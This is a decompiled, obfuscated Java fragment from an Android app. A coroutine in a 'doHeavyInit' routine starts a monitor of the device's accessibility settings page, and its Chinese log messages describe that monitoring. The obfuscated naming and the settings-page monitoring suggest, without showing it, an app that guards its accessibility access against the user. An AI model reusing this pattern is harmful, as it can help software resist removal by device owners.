package com.storm.safe.rock.service;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlinx.coroutines.AbstractC0780a0;
import p000.AbstractC1262tj;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.xz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$doHeavyInit$4", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$doHeavyInit$4 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ dqtvuisjd f52512a1;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$doHeavyInit$4(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52512a1 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$doHeavyInit$4(this.f52512a1, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        dqtvuisjd$doHeavyInit$4 dqtvuisjd_doheavyinit_4 = (dqtvuisjd$doHeavyInit$4) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        dqtvuisjd_doheavyinit_4.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        dqtvuisjd dqtvuisjdVar = this.f52512a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            xz0 xz0Var = dqtvuisjdVar.f52413e4;
            if (xz0Var != null) {
                xz0Var.m215218a0();
            }
        } catch (Exception unused) {
        }
        boolean z = dqtvuisjdVar.f52442h3;
        if (z) {
            try {
                if (z) {
                    try {
                        t60.m214714d6("dqtvuisjd", "✅ [监控] 启动无障碍设置页面监控");
                        dqtvuisjdVar.f52443h4 = AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$startAccessibilityPageMonitor$1(dqtvuisjdVar, null), 2);
                    } catch (Exception e) {
                        t60.m214705c6("dqtvuisjd", "❌ [监控] 启动无障碍页面监控失败", e);
                    }
                } else {
                    t60.m214702c3("dqtvuisjd", "🔍 [监控] 无障碍页面监控已禁用，跳过");
                }
            } catch (Exception unused2) {
            }
        }
        return C1351vv.f60710b1;
    }
}
